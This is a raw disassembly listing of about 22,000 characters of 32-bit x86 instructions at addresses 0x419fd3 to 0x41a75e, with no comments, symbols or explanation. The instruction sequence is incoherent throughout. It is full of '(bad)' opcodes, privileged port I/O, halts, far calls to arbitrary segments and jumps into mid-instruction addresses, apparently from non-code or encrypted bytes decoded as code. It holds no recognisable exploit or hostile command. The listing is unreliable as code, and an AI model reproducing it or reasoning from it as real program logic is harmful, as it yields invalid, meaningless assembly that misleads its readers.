  419fd3:	mov    eax,ds:0xba2e723d
  419fd8:	push   eax
  419fd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fda:	shl    DWORD PTR [ebp-0x5f236c11],1
  419fe0:	mov    ch,0xc7
  419fe2:	fisttp DWORD PTR [edi+0x4968e838]
  419fe8:	xchg   ebp,eax
  419fe9:	call   0xaf22a63c
  419fee:	mov    ebx,0x623c26cb
  419ff3:	cmp    ecx,DWORD PTR ss:[ebx+0x42038c99]
  419ffa:	jne    0x419fb9
  419ffc:	call   FWORD PTR ds:0xb9d83ed8
  41a002:	(bad)  [edi-0x7d]
  41a005:	sar    BYTE PTR [esi-0x667d9bc3],cl
  41a00b:	es jno 0x419fbd
  41a00e:	mov    bl,0xa8
  41a010:	popf   
  41a011:	sbb    dl,BYTE PTR [esi+0x643b43a3]
  41a017:	pop    edi
  41a018:	push   edx
  41a019:	mov    ah,0xd
  41a01b:	loop   0x419fcb
  41a01d:	inc    eax
  41a01e:	push   0x17
  41a020:	imul   ecx,DWORD PTR [esi-0x40cca911],0xffffffac
  41a027:	(bad)  
  41a028:	loopne 0x419fd3
  41a02a:	outs   dx,BYTE PTR ds:[esi]
  41a02b:	push   es
  41a02c:	fwait
  41a02d:	pop    es
  41a02e:	sbb    DWORD PTR [ebp+0x40],ecx
  41a031:	fs push esp
  41a033:	fiadd  WORD PTR [edx-0x35]
  41a036:	xchg   edx,eax
  41a037:	jns    0x419ffa
  41a039:	aam    0xb3
  41a03b:	sar    DWORD PTR [edx-0x72148d3],0xbb
  41a042:	in     al,0x35
  41a044:	fbld   TBYTE PTR [ebp-0x7e]
  41a047:	mov    cl,0x32
  41a049:	push   esp
  41a04a:	push   0xffffffab
  41a04c:	call   0x5b37:0x554b9fd7
  41a053:	fimul  WORD PTR [esi]
  41a055:	aas    
  41a056:	ret    0x581
  41a059:	xlat   BYTE PTR ds:[ebx]
  41a05a:	aaa    
  41a05b:	push   edx
  41a05c:	pop    ds
  41a05d:	das    
  41a05e:	rol    DWORD PTR [ebx-0x51],cl
  41a061:	sbb    DWORD PTR [ebp+eax*2-0x6aeb5605],edi
  41a068:	sbb    DWORD PTR [ecx-0x431ed131],esi
  41a06e:	add    DWORD PTR [edi+0x60e1cd7b],0xffffffad
  41a075:	sub    bh,dl
  41a077:	outs   dx,DWORD PTR ds:[esi]
  41a078:	pop    edx
  41a079:	inc    edi
  41a07a:	mov    bl,BYTE PTR [esi+0x34b86e2b]
  41a080:	push   ebp
  41a081:	cmp    DWORD PTR [eax-0x4f],esi
  41a084:	jnp    0x41a0ee
  41a086:	fcomp  QWORD PTR [ebx]
  41a088:	add    al,0x8d
  41a08a:	push   ss
  41a08b:	xchg   esi,eax
  41a08c:	(bad)  
  41a08d:	(bad)
  41a091:	es mov ebp,0x439aeb4
  41a097:	or     BYTE PTR [ebp+0x71],dl
  41a09a:	enter  0x8931,0xe2
  41a09e:	jle    0x41a0c6
  41a0a0:	fwait
  41a0a1:	mov    al,0x5c
  41a0a3:	inc    esi
  41a0a4:	cli    
  41a0a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0a6:	stos   DWORD PTR es:[edi],eax
  41a0a7:	ret    0xe0cf
  41a0aa:	cmp    dl,BYTE PTR [esi+0x3798770d]
  41a0b0:	jbe    0x41a063
  41a0b2:	les    ebx,FWORD PTR es:[edx]
  41a0b5:	mov    si,0x80c9
  41a0b9:	jae    0x41a06f
  41a0bb:	cli    
  41a0bc:	(bad)  
  41a0bd:	repz mov eax,esp
  41a0c0:	mov    edi,0x6a0cd60f
  41a0c5:	repnz bnd jnp 0x41a0d7
  41a0c9:	xor    al,BYTE PTR [edi+0x7b]
  41a0cc:	jnp    0x41a11f
  41a0ce:	mov    esp,0x99eefe7a
  41a0d3:	xchg   esp,eax
  41a0d4:	ins    BYTE PTR es:[edi],dx
  41a0d5:	stos   DWORD PTR es:[edi],eax
  41a0d6:	and    edx,esi
  41a0d8:	dec    esi
  41a0d9:	repnz scas eax,DWORD PTR es:[edi]
  41a0db:	and    DWORD PTR [ebx+esi*2],esi
  41a0de:	xchg   DWORD PTR [ecx-0x4b],esp
  41a0e1:	jno    0x41a0c1
  41a0e3:	bswap  ebx
  41a0e5:	mov    edx,0x398b61e9
  41a0ea:	aam    0x30
  41a0ec:	shl    DWORD PTR [ecx],0xf3
  41a0ef:	cmp    dl,BYTE PTR [ecx]
  41a0f1:	mov    dl,0xa5
  41a0f3:	or     al,0x90
  41a0f5:	xchg   edx,eax
  41a0f6:	push   esp
  41a0f7:	mov    WORD PTR [ebx+ebp*1+0x72],ss
  41a0fb:	xchg   edx,eax
  41a0fc:	adc    ecx,DWORD PTR [edx+esi*2]
  41a0ff:	pop    ds
  41a100:	and    cl,bh
  41a102:	push   ss
  41a103:	dec    eax
  41a104:	out    dx,eax
  41a105:	pop    ebx
  41a106:	xchg   ecx,eax
  41a107:	mov    ecx,0x81c0240f
  41a10c:	add    BYTE PTR [ecx-0x640c19bc],bh
  41a112:	xor    BYTE PTR [edi+0x50],0x32
  41a116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a117:	jnp    0x41a15b
  41a119:	adc    eax,DWORD PTR ds:0xc897f90a
  41a11f:	sahf   
  41a120:	fdiv   DWORD PTR [eax+edx*8+0x36]
  41a124:	test   al,0x7f
  41a126:	cmp    edi,DWORD PTR [edx]
  41a128:	fild   DWORD PTR [ebx]
  41a12a:	test   al,0x55
  41a12c:	push   esi
  41a12d:	mov    edx,0xf7e03728
  41a132:	cwde   
  41a133:	sbb    al,0x9c
  41a135:	inc    eax
  41a136:	aas    
  41a137:	ins    BYTE PTR es:[edi],dx
  41a138:	adc    ah,BYTE PTR [ebx]
  41a13a:	jmp    0x41a1b3
  41a13c:	pop    ebp
  41a13d:	add    esp,esi
  41a13f:	adc    al,0x20
  41a141:	dec    ebx
  41a142:	adc    ah,BYTE PTR [ebx-0x64cd30cc]
  41a148:	test   DWORD PTR [ecx-0x5],eax
  41a14b:	pusha  
  41a14c:	add    BYTE PTR ds:0x486a141b,dl
  41a152:	aam    0xea
  41a154:	clc    
  41a155:	pop    ebp
  41a156:	ins    BYTE PTR es:[edi],dx
  41a157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a158:	loope  0x41a1b7
  41a15a:	sti    
  41a15b:	std    
  41a15c:	out    dx,al
  41a15d:	pop    edx
  41a15e:	or     bh,BYTE PTR [ecx]
  41a160:	imul   edx,ebx,0xe
  41a163:	mov    fs,eax
  41a165:	sub    dh,ch
  41a167:	loopne 0x41a119
  41a169:	xor    al,0xe8
  41a16b:	not    DWORD PTR [esi-0x59b1756e]
  41a171:	sbb    BYTE PTR [eax],0x31
  41a174:	enter  0x1e5e,0x8e
  41a178:	leave  
  41a179:	icebp  
  41a17a:	jmp    0x116a:0xfa8d4ae4
  41a181:	cmp    bl,ch
  41a183:	sbb    DWORD PTR [eax+0x8138a81],eax
  41a189:	les    ebp,FWORD PTR [ecx-0x5b]
  41a18c:	ins    DWORD PTR es:[edi],dx
  41a18d:	in     eax,0x90
  41a18f:	xchg   DWORD PTR [eax],esp
  41a191:	mov    al,0x96
  41a193:	arpl   WORD PTR [ecx+0x70],dx
  41a196:	push   edx
  41a197:	cld    
  41a198:	add    DWORD PTR [ebx+ebp*2+0x76c139db],0x2b
  41a1a0:	in     al,dx
  41a1a1:	scas   al,BYTE PTR es:[edi]
  41a1a2:	in     al,dx
  41a1a3:	es pushf 
  41a1a5:	dec    esi
  41a1a6:	mov    cl,0x37
  41a1a8:	es pushf 
  41a1aa:	push   esi
  41a1ab:	add    BYTE PTR [edi+edi*4-0x7],0x65
  41a1b0:	pusha  
  41a1b1:	push   ecx
  41a1b2:	ror    edx,1
  41a1b4:	leave  
  41a1b5:	jge    0x41a1f1
  41a1b7:	hlt    
  41a1b8:	jp     0x41a1d5
  41a1ba:	cmp    BYTE PTR [edx],cl
  41a1bc:	sbb    BYTE PTR [edx+0x1e],bh
  41a1bf:	pop    ebp
  41a1c0:	adc    BYTE PTR [esi+edx*2+0x2fb0e706],al
  41a1c7:	xchg   edi,eax
  41a1c8:	das    
  41a1c9:	(bad)  [ecx-0x69]
  41a1cc:	and    ebx,DWORD PTR [ebp+0x600c2f8]
  41a1d2:	dec    edx
  41a1d3:	jp     0x41a1b6
  41a1d5:	inc    ebp
  41a1d6:	push   ebp
  41a1d7:	mov    al,ds:0x20afde99
  41a1dc:	rol    BYTE PTR [esp+esi*8+0x53bff61],cl
  41a1e3:	test   eax,0x255fd9fd
  41a1e8:	loopne 0x41a1ed
  41a1ea:	jg     0x41a1cb
  41a1ec:	(bad)  
  41a1ed:	lock xchg edx,eax
  41a1ef:	or     DWORD PTR [ebx+ebp*2-0x25],edx
  41a1f3:	imul   ecx,esp,0xc2c8532d
  41a1f9:	fnsave [ecx+0x7f]
  41a1fc:	push   ecx
  41a1fd:	stos   DWORD PTR es:[edi],eax
  41a1fe:	or     BYTE PTR [ecx],cl
  41a200:	or     edx,edi
  41a202:	and    BYTE PTR [ecx],0xd8
  41a205:	sti    
  41a206:	(bad)  
  41a208:	call   0x4bf7acc4
  41a20d:	(bad)  
  41a20e:	jae    0x41a234
  41a210:	js     0x41a22e
  41a212:	int    0xe4
  41a214:	(bad)  
  41a215:	hlt    
  41a216:	adc    ch,BYTE PTR [edx]
  41a218:	lds    esp,FWORD PTR [ebx+esi*8+0x569c]
  41a21f:	add    BYTE PTR [eax],al
  41a221:	add    BYTE PTR [eax],bl
  41a223:	push   ebp
  41a224:	push   cs
  41a225:	add    eax,0x5d1b5f4f
  41a22a:	lods   eax,DWORD PTR ds:[esi]
  41a22b:	test   al,0x5b
  41a22d:	gs mov al,0x4
  41a230:	add    DWORD PTR [edi],esi
  41a232:	mov    dh,0x1e
  41a234:	add    DWORD PTR [eax],eax
  41a236:	repz add al,0x0
  41a239:	add    bl,bh
  41a23b:	lahf   
  41a23c:	xor    eax,0x51011a9e
  41a241:	xchg   ebp,eax
  41a242:	adc    DWORD PTR [edx-0x5d],edi
  41a245:	call   0xe868:0xea42ebfa
  41a24c:	add    ecx,DWORD PTR [edx+0x9fad042]
  41a252:	pop    ebx
  41a253:	mov    eax,ds:0xf3c83773
  41a258:	mov    edi,0xe5ca59c1
  41a25d:	jae    0x41a27c
  41a25f:	mov    dl,bh
  41a261:	aad    0xa4
  41a263:	push   ebp
  41a264:	enter  0xfd9b,0xe8
  41a268:	xchg   esi,eax
  41a269:	jnp    0x41a23e
  41a26b:	sbb    bh,BYTE PTR [ecx+0x1c7c8f1b]
  41a271:	mov    eax,ds:0x34530e5d
  41a276:	cmp    al,0xcb
  41a278:	inc    esi
  41a279:	push   ebp
  41a27a:	dec    edi
  41a27b:	lea    ebp,[edx-0xc508aaf]
  41a281:	add    al,0xe6
  41a283:	mov    DWORD PTR [ebp+0x32],ebx
  41a286:	sub    eax,0xb7dbbf79
  41a28b:	dec    edx
  41a28c:	mov    edi,0xe94b3130
  41a291:	ret    0x86dc
  41a294:	cwde   
  41a295:	div    DWORD PTR [ebx+0x42b25d]
  41a29b:	jmp    0x41a2f4
  41a29d:	jnp    0x41a23a
  41a29f:	mov    ?,WORD PTR [ebp-0x1d]
  41a2a2:	lods   al,BYTE PTR ds:[esi]
  41a2a3:	fidiv  DWORD PTR [esi+0x2aab443a]
  41a2a9:	and    bl,dh
  41a2ab:	mov    dl,0x5a
  41a2ad:	mov    ecx,0x16e7a7a0
  41a2b2:	cmp    ah,BYTE PTR [edi+0x367c38ae]
  41a2b8:	cmp    esp,ebx
  41a2ba:	ins    BYTE PTR es:[edi],dx
  41a2bb:	mov    edx,ecx
  41a2bd:	sub    ecx,DWORD PTR [eax+0x2136a7d6]
  41a2c3:	cli    
  41a2c4:	cmp    al,0xc3
  41a2c6:	shr    cl,1
  41a2c8:	xchg   ecx,eax
  41a2c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2ca:	mov    BYTE PTR [eax],dl
  41a2cc:	cmp    eax,0xca19a03c
  41a2d1:	sbb    BYTE PTR [ebp-0x55606b1a],cl
  41a2d7:	imul   eax,DWORD PTR [eax+esi*8],0x26
  41a2db:	ds push ebp
  41a2dd:	mov    WORD PTR [edi-0x17b733bc],gs
  41a2e3:	dec    edi
  41a2e4:	(bad)  
  41a2e5:	call   0xfbef1211
  41a2ea:	dec    edx
  41a2eb:	inc    eax
  41a2ec:	sbb    dh,BYTE PTR [ebx+0x4272b017]
  41a2f2:	cli    
  41a2f3:	or     BYTE PTR [edx-0x9],bl
  41a2f6:	xchg   esi,eax
  41a2f7:	xor    BYTE PTR [esi+0x1f],ch
  41a2fa:	call   0xe0d1:0x6019811a
  41a301:	int    0x69
  41a303:	pop    esi
  41a304:	or     eax,0x8044de87
  41a309:	add    DWORD PTR [edx-0xdca8fb6],ebp
  41a30f:	adc    al,0xc3
  41a311:	mov    DWORD PTR [ecx+0x57],edx
  41a314:	(bad)  
  41a315:	popa   
  41a316:	mov    ch,0xdb
  41a318:	sti    
  41a319:	out    0x84,eax
  41a31b:	pusha  
  41a31c:	sbb    DWORD PTR [ecx*1+0x5480f9d],edi
  41a323:	sbb    ecx,edi
  41a325:	pop    ss
  41a326:	jns    0x41a369
  41a328:	imul   esi,DWORD PTR [ecx+0x3f58c35c],0xffffffad
  41a32f:	lds    esp,FWORD PTR ds:0x35c9e0d5
  41a335:	cmp    eax,0xd21cc142
  41a33a:	xor    dl,BYTE PTR [eax-0x48]
  41a33d:	jbe    0x41a3a2
  41a33f:	int    0x64
  41a341:	jmp    0x41a398
  41a343:	(bad)
  41a347:	jo     0x41a316
  41a349:	dec    ecx
  41a34a:	fwait
  41a34b:	or     ebp,edi
  41a34d:	jl     0x41a2e9
  41a34f:	fiadd  WORD PTR [edi-0x22d272f]
  41a355:	xchg   DWORD PTR [ebx],esi
  41a357:	xor    ch,BYTE PTR [ebx+0x5250a920]
  41a35d:	test   eax,0xd009c127
  41a362:	lods   eax,DWORD PTR ds:[esi]
  41a363:	and    DWORD PTR [ecx+ebp*2+0x1b],0xbff7d9dd
  41a36b:	push   ecx
  41a36c:	out    0x79,eax
  41a36e:	cwde   
  41a36f:	mov    bl,0x44
  41a371:	adc    DWORD PTR [ebx-0x25],0xffffff95
  41a375:	repz in eax,0x66
  41a378:	add    BYTE PTR [edx],al
  41a37a:	inc    ecx
  41a37b:	jb     0x41a328
  41a37d:	sbb    cl,bh
  41a37f:	cmp    edx,DWORD PTR [edx]
  41a381:	shr    BYTE PTR [ecx+eax*4],cl
  41a384:	(bad)  
  41a385:	mov    DWORD PTR [edi-0x3967a791],edi
  41a38b:	jb     0x41a33a
  41a38d:	cwde   
  41a38e:	aaa    
  41a38f:	jno    0x41a34f
  41a391:	out    0xe4,eax
  41a393:	fwait
  41a394:	mov    edx,0xb9035ae4
  41a399:	push   ebp
  41a39a:	pop    esi
  41a39b:	sub    eax,0x983a019f
  41a3a0:	jp     0x41a419
  41a3a2:	rol    DWORD PTR [ebp+0x648765da],0x37
  41a3a9:	aas    
  41a3aa:	or     eax,0xeb57991a
  41a3af:	jno    0x41a3bd
  41a3b1:	dec    ebx
  41a3b2:	push   ebp
  41a3b3:	les    eax,FWORD PTR [esi]
  41a3b5:	jp     0x41a3ea
  41a3b7:	cmp    eax,0x134b0e8
  41a3bc:	repnz inc eax
  41a3be:	dec    eax
  41a3bf:	ins    DWORD PTR es:[edi],dx
  41a3c0:	inc    esp
  41a3c1:	int    0x3f
  41a3c3:	mov    ch,0xa0
  41a3c5:	out    dx,al
  41a3c6:	mov    ds:0x2e0d6716,al
  41a3cb:	pop    edi
  41a3cc:	sar    BYTE PTR [edx],cl
  41a3ce:	push   ecx
  41a3cf:	std    
  41a3d0:	mov    bl,0xcb
  41a3d2:	pop    ds
  41a3d3:	jecxz  0x41a3f1
  41a3d5:	dec    edx
  41a3d7:	imul   ebx,DWORD PTR [ebx-0x9d5c78],0xffffffbf
  41a3de:	mov    eax,ds:0x1d8234ca
  41a3e3:	jg     0x41a377
  41a3e5:	out    0xd0,al
  41a3e7:	push   ds
  41a3e8:	cmp    DWORD PTR [edx-0x6a03288f],ebx
  41a3ee:	mov    edi,DWORD PTR [edx]
  41a3f0:	cmp    al,0x2a
  41a3f2:	mov    ecx,0xd3217074
  41a3f7:	sub    DWORD PTR [edi],edx
  41a3f9:	mov    eax,0xb0009627
  41a3ff:	(bad)  
  41a401:	(bad)  
  41a402:	mov    al,ds:0x72e561e9
  41a407:	mov    ecx,0xb071f3ff
  41a40c:	int3   
  41a40d:	cmp    bh,BYTE PTR [ecx+0x53]
  41a410:	in     eax,dx
  41a411:	loopne 0x41a44c
  41a413:	stos   BYTE PTR es:[edi],al
  41a414:	push   0x38bee277
  41a419:	dec    edx
  41a41a:	sar    ah,cl
  41a41c:	jmp    0x41a439
  41a41e:	inc    ebx
  41a41f:	mov    ecx,0x97a1e2e9
  41a424:	dec    ecx
  41a425:	scas   al,BYTE PTR es:[edi]
  41a426:	jmp    0x41a436
  41a428:	push   es
  41a429:	inc    esp
  41a42a:	or     eax,0x5d828b7f
  41a42f:	jne    0x41a3b7
  41a431:	sub    DWORD PTR [ecx-0x46],eax
  41a434:	aaa    
  41a435:	hlt    
  41a436:	jne    0x41a4ac
  41a438:	dec    eax
  41a439:	sbb    edx,ecx
  41a43b:	lods   eax,DWORD PTR ds:[esi]
  41a43c:	dec    ecx
  41a43d:	das    
  41a43e:	int    0x20
  41a440:	push   ecx
  41a441:	push   cs
  41a442:	(bad)  [ebx+0x7ba1e0d9]
  41a448:	cmp    DWORD PTR [edx],esi
  41a44a:	test   DWORD PTR [esi+eax*8-0x593746ff],ecx
  41a451:	dec    ebx
  41a452:	imul   ebp,DWORD PTR [edi-0x29c2e4d3],0xda48d3f0
  41a45c:	inc    eax
  41a45d:	cwde   
  41a45e:	dec    esi
  41a45f:	push   cs
  41a460:	(bad)  [eax+0xd15ee48]
  41a466:	pop    es
  41a467:	push   0xe327a268
  41a46c:	sbb    dl,BYTE PTR [eax+0x71e5ddbd]
  41a472:	and    eax,0x47555242
  41a477:	clc    
  41a478:	sbb    al,0xf3
  41a47a:	xor    DWORD PTR [edi],ecx
  41a47c:	push   esi
  41a47d:	repnz test ecx,ebp
  41a480:	mov    al,0x45
  41a482:	push   eax
  41a483:	xchg   ecx,eax
  41a484:	mov    ebp,ebp
  41a486:	leave  
  41a487:	mov    edx,esp
  41a489:	or     ebx,edi
  41a48b:	sahf   
  41a48c:	mov    bl,0x44
  41a48e:	std    
  41a48f:	lods   al,BYTE PTR ds:[esi]
  41a490:	mov    ds:0x6b50f30f,eax
  41a495:	cmp    edi,ebp
  41a497:	imul   BYTE PTR [edi-0x28e30c78]
  41a49d:	mov    ebx,0x68e757e5
  41a4a2:	out    0x59,eax
  41a4a4:	cmp    edi,ebp
  41a4a6:	(bad)  
  41a4a7:	das    
  41a4a8:	inc    esp
  41a4a9:	cli    
  41a4aa:	fsub   QWORD PTR [edi]
  41a4ac:	push   ss
  41a4ad:	adc    ch,BYTE PTR [esi]
  41a4af:	sub    al,0x5
  41a4b1:	test   DWORD PTR [ebx],edi
  41a4b3:	sbb    esi,DWORD PTR [esi+0xbb9888a]
  41a4b9:	xchg   edi,eax
  41a4ba:	scas   eax,DWORD PTR es:[edi]
  41a4bb:	jb     0x41a4e6
  41a4bd:	stos   DWORD PTR es:[edi],eax
  41a4be:	loope  0x41a4a4
  41a4c0:	(bad)  
  41a4c1:	sbb    BYTE PTR [edi+0x6b],0xdc
  41a4c5:	dec    esp
  41a4c6:	ret    
  41a4c7:	les    ebx,FWORD PTR [edi+0x43]
  41a4ca:	xchg   bh,ch
  41a4cc:	clc    
  41a4cd:	test   BYTE PTR [ebx+0x14],ah
  41a4d0:	out    0x81,al
  41a4d2:	cli    
  41a4d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4d4:	and    al,0x3e
  41a4d6:	dec    ecx
  41a4d7:	xchg   edx,eax
  41a4d8:	push   cs
  41a4d9:	add    cl,BYTE PTR ss:[esi+0x7b]
  41a4dd:	cld    
  41a4de:	push   cs
  41a4df:	jo     0x41a470
  41a4e1:	jecxz  0x41a4bb
  41a4e3:	aaa    
  41a4e4:	sbb    al,BYTE PTR [edx]
  41a4e6:	mov    ds:0x4bf22988,al
  41a4eb:	push   0x63d317fb
  41a4f0:	inc    esi
  41a4f1:	sbb    al,0xac
  41a4f3:	div    DWORD PTR [esi+0x26]
  41a4f6:	dec    ecx
  41a4f7:	push   edi
  41a4f8:	jl     0x41a487
  41a4fa:	inc    ebx
  41a4fb:	push   ebp
  41a4fc:	cli    
  41a4fd:	xchg   edx,eax
  41a4fe:	sar    BYTE PTR [esi],cl
  41a500:	out    0xbd,eax
  41a502:	cmp    eax,0xccaf9cbe
  41a507:	aaa    
  41a508:	out    0xcb,al
  41a50a:	xchg   ecx,eax
  41a50b:	cwde   
  41a50c:	pushf  
  41a50d:	sbb    DWORD PTR [esi+0x354fb000],edx
  41a513:	int    0x7d
  41a515:	call   0x572ca72b
  41a51a:	adc    esp,DWORD PTR [esi+eiz*8+0x2233a5da]
  41a521:	pop    ds
  41a522:	sub    ax,0xfeee
  41a526:	mov    eax,0xecddcb51
  41a52b:	mov    al,0xe6
  41a52d:	adc    bl,BYTE PTR [esi+edx*1-0x6c85746c]
  41a534:	in     eax,dx
  41a535:	call   0x358f:0x11258df3
  41a53c:	or     edx,ebp
  41a53e:	add    DWORD PTR [esi-0x566070a0],edi
  41a544:	(bad)  
  41a545:	int    0x8e
  41a547:	mov    es,WORD PTR [edx+0x77]
  41a54a:	lods   eax,DWORD PTR ds:[esi]
  41a54b:	mov    al,0xd0
  41a54d:	cmp    ebx,esp
  41a54f:	repz pop ecx
  41a551:	cwde   
  41a552:	imul   edx,DWORD PTR [esi],0xc786785
  41a558:	js     0x41a5d8
  41a55a:	ja     0x41a56c
  41a55c:	and    eax,0x3e1da8d4
  41a561:	pop    ebx
  41a562:	pop    esp
  41a563:	mov    al,0xc
  41a565:	push   0xff011c6
  41a56a:	hlt    
  41a56b:	mov    ds:0xd8e52952,al
  41a570:	int    0x4e
  41a572:	or     al,0xcd
  41a574:	sbb    edx,DWORD PTR [eax-0x39365810]
  41a57a:	push   edx
  41a57b:	mov    eax,0xaeb9b2a5
  41a580:	push   cs
  41a581:	push   esi
  41a582:	jmp    0x6e22df8d
  41a587:	(bad)  
  41a588:	ds loopne 0x41a55e
  41a58b:	mov    al,0x9
  41a58d:	jle    0x41a53a
  41a58f:	mov    esi,0xad1fc966
  41a594:	mov    esp,0x35749b9e
  41a599:	mov    bl,0x6b
  41a59b:	dec    edx
  41a59c:	int    0xa9
  41a59e:	dec    ebx
  41a59f:	adc    DWORD PTR [ebp+0x1588b6d0],ebp
  41a5a5:	pop    es
  41a5a6:	adc    ebx,DWORD PTR [eax+eiz*4-0x28]
  41a5aa:	call   0x5485:0x994389c3
  41a5b1:	xchg   esp,eax
  41a5b2:	push   ebx
  41a5b3:	fdivr  DWORD PTR [esp+eiz*2-0x3d]
  41a5b7:	fmul   DWORD PTR ds:0xf10c1dd5
  41a5bd:	adc    bh,BYTE PTR [ebp+ebx*8-0x4b459e4a]
  41a5c4:	pop    ds
  41a5c5:	add    eax,0x578682eb
  41a5ca:	test   DWORD PTR [edx],ebx
  41a5cc:	test   BYTE PTR [edi+0x14205bf6],al
  41a5d2:	inc    esi
  41a5d3:	in     eax,0x41
  41a5d5:	sub    DWORD PTR [edi],edi
  41a5d7:	into   
  41a5d8:	fnstsw WORD PTR [ecx-0x6]
  41a5db:	xchg   esp,eax
  41a5dc:	call   0x8c26:0xbe4d3551
  41a5e3:	sbb    BYTE PTR [edi],cl
  41a5e5:	jmp    0x4aa50487
  41a5ea:	and    dl,BYTE PTR [edi]
  41a5ec:	sbb    al,ah
  41a5ee:	in     al,0xf7
  41a5f0:	imul   ebx,DWORD PTR [ebp-0x77d09fbd],0xb8104f9c
  41a5fa:	(bad)  
  41a5fb:	call   0x882136b8
  41a600:	or     al,0x43
  41a602:	scas   eax,DWORD PTR es:[edi]
  41a603:	cwde   
  41a604:	mov    ds:0x26484dd5,al
  41a609:	mov    eax,ds:0x941cc482
  41a60e:	mov    edx,edx
  41a610:	(bad)  
  41a611:	xor    BYTE PTR [ecx-0x4fe536b6],bl
  41a617:	(bad)  
  41a618:	push   edx
  41a619:	fbld   TBYTE PTR [esi+0x438ec64c]
  41a61f:	mov    fs,WORD PTR [eax]
  41a621:	push   ebx
  41a622:	mov    edi,0x2077c681
  41a627:	repnz in eax,0x36
  41a62a:	pushf  
  41a62b:	std    
  41a62c:	mov    dl,0xd8
  41a62e:	and    eax,ebp
  41a630:	not    DWORD PTR [edi]
  41a632:	and    edx,DWORD PTR [ebx]
  41a634:	cs push ss
  41a636:	mov    ch,0x19
  41a638:	push   eax
  41a639:	popa   
  41a63a:	cmp    BYTE PTR [eax-0x16],dl
  41a63d:	fst    DWORD PTR ds:0x4a2b75e3
  41a643:	add    al,0x56
  41a645:	adc    bh,bh
  41a647:	mov    ch,BYTE PTR [ebx+0x47]
  41a64a:	ds pop ds
  41a64c:	es sbb al,0x71
  41a64f:	cmp    al,0x84
  41a651:	pop    esi
  41a652:	(bad)  
  41a653:	mov    cs,WORD PTR [ecx+0x36b3f766]
  41a659:	lods   eax,DWORD PTR ds:[esi]
  41a65a:	(bad)  
  41a65b:	retf   
  41a65c:	fistp  DWORD PTR [edi]
  41a65e:	add    al,0x6a
  41a660:	mov    dl,0x1c
  41a662:	and    al,0x8
  41a664:	div    ch
  41a666:	or     al,0x1d
  41a668:	sub    cl,BYTE PTR [edx]
  41a66a:	mov    al,ds:0x33c4b744
  41a66f:	or     eax,0xb2eed9b6
  41a674:	(bad)  
  41a675:	mov    ebp,0xdd73bfc5
  41a67a:	and    ebx,DWORD PTR [edx+0x585554fc]
  41a680:	dec    esp
  41a681:	pop    ss
  41a682:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a683:	mov    eax,0xdedc57f6
  41a688:	fdiv   st(7),st
  41a68a:	in     al,dx
  41a68b:	(bad)  
  41a68c:	mov    dh,0x44
  41a68e:	fnstsw WORD PTR fs:[esp+ebp*1]
  41a692:	(bad)  
  41a694:	ret    
  41a695:	sub    eax,0x4ef24f04
  41a69a:	inc    ecx
  41a69b:	adc    eax,0x81f0452c
  41a6a0:	jns    0x41a6d8
  41a6a2:	jbe    0x41a701
  41a6a4:	or     edx,eax
  41a6a6:	pop    ds
  41a6a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6a8:	xchg   BYTE PTR [ebp-0x670339c3],dl
  41a6ae:	push   edi
  41a6af:	cdq    
  41a6b0:	pop    es
  41a6b1:	mov    es,WORD PTR [ecx-0x9]
  41a6b4:	int3   
  41a6b5:	(bad)  
  41a6b6:	fstp   QWORD PTR [esi-0x74]
  41a6b9:	mov    WORD PTR [ecx],?
  41a6bb:	lock ret 
  41a6bd:	es enter 0xddcc,0x8f
  41a6c2:	sub    DWORD PTR [eax],ebp
  41a6c4:	imul   eax,DWORD PTR [ebp-0x2a909e08],0xeb9cbd27
  41a6ce:	scas   eax,DWORD PTR es:[edi]
  41a6cf:	push   0xffffffa6
  41a6d1:	mov    esi,0x4d587684
  41a6d6:	es test eax,0x22af1191
  41a6dc:	jb     0x41a757
  41a6de:	outs   dx,DWORD PTR ds:[esi]
  41a6df:	mov    ecx,DWORD PTR [esi]
  41a6e1:	call   0x941f37ee
  41a6e6:	addr16 dec esi
  41a6e8:	les    esp,FWORD PTR ds:0x6fb33dcc
  41a6ee:	mov    al,es:0x3826db58
  41a6f4:	mov    eax,0x81646900
  41a6f9:	jns    0x41a6a9
  41a6fb:	push   ebx
  41a6fc:	popf   
  41a6fd:	push   ss
  41a6fe:	dec    eax
  41a6ff:	cmp    eax,eax
  41a701:	sti    
  41a702:	mov    ah,BYTE PTR [ecx]
  41a704:	xlat   BYTE PTR ds:[ebx]
  41a705:	aas    
  41a706:	arpl   WORD PTR [esi+0x0],dx
  41a709:	mov    ebp,0x9900806a
  41a70e:	out    dx,eax
  41a70f:	sub    esi,ecx
  41a711:	mov    al,ds:0x21bdaf6d
  41a716:	lock push ecx
  41a718:	sbb    esp,edi
  41a71a:	add    edx,DWORD PTR [ecx+0x5a]
  41a71d:	jae    0x41a6a2
  41a71f:	ja     0x41a6ac
  41a721:	jg     0x41a6c6
  41a723:	dec    ebp
  41a724:	mov    edi,ebx
  41a726:	or     eax,DWORD PTR [edi+0x25]
  41a729:	aaa    
  41a72a:	sub    al,0xe7
  41a72c:	mov    al,0x0
  41a72e:	add    BYTE PTR [eax],al
  41a730:	add    BYTE PTR [eax],al
  41a732:	dec    esi
  41a733:	outs   dx,DWORD PTR ds:[esi]
  41a734:	je     0x41a75e
  41a736:	jne    0x41a773
  41a738:	pop    esi
  41a739:	outs   dx,DWORD PTR ds:[esi]
  41a73a:	out    dx,eax
  41a73b:	aaa    
  41a73c:	jae    0x41a716
  41a73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a73f:	addr16 aaa 
  41a741:	fisubr DWORD PTR [ecx-0xcfffedd]
  41a747:	add    al,0x0
  41a749:	add    al,al
  41a74b:	or     ecx,DWORD PTR [edx-0x73]
  41a74e:	out    dx,al
  41a74f:	icebp  
  41a750:	mov    eax,ds:0x8440094
  41a755:	lods   al,BYTE PTR ds:[esi]
  41a756:	pop    esi
  41a757:	int3   
  41a758:	retf   
  41a759:	outs   dx,DWORD PTR ds:[esi]
  41a75a:	jmp    0x41a739
  41a75c:	pop    ss
  41a75d:	push   edx
  41a75e:	jae    0x41a793
